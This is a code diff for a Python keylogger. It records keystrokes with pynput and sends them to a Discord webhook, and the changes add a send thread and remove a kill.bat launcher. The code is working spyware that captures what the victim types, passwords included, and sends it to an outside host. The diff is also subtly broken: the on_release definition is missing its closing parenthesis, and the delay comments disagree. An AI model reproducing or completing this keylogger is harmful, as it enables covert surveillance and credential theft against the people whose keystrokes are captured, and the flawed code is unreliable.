@@ -1,5 +1,6 @@
 from pynput import keyboard
 import requests
+import threading
 import time
 import subprocess
 import os
@@ -23,6 +24,7 @@ special_keys = {
     keyboard.Key.esc: " ESC ",
 }
 
+
 def send_to_webhook(message):
     """Send the message to the Discord webhook."""
     payload = {
@@ -33,6 +35,7 @@ def send_to_webhook(message):
     except Exception as e:
         print(f"Error sending message to webhook: {e}")
 
+
 def send_keystrokes_after_delay():
     """Send the keystrokes to the webhook after 10 seconds."""
     global keystrokes
@@ -40,6 +43,7 @@ def send_keystrokes_after_delay():
     if keystrokes:
         send_to_webhook(keystrokes)
         keystrokes = ""  # Reset keystrokes after sending
+
 
 def on_press(key):
     global keystrokes
@@ -53,26 +57,16 @@ def on_press(key):
     # Append the key press to the keystrokes string
     keystrokes += key_str
 
-    # Start a timer to send keystrokes after 10 seconds
-    send_keystrokes_after_delay()
+    # Start a timer to send keystrokes after 30 seconds
+    threading.Thread(target=send_keystrokes_after_delay).start()
 
-def on_release(key):
+
+def on_release(key
     if key == keyboard.Key.esc:
         # Stop the listener when the Esc key is pressed
         return False
 
-def execute_kill_script():
-    """Execute the kill.bat script."""
-    username = os.getlogin()
-    bat_file_path = rf"C:\Users\{username}\kl2\kill.bat"
-    subprocess.run([bat_file_path], shell=True)
 
 # Set up the listener
-listener = keyboard.Listener(on_press=on_press, on_release=on_release)
-listener.start()
-
-# Wait for the listener to finish (this blocks the main thread until ESC is pressed)
-listener.join()
-
-# Execute the kill.bat script after the listener finishes
-execute_kill_script()
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
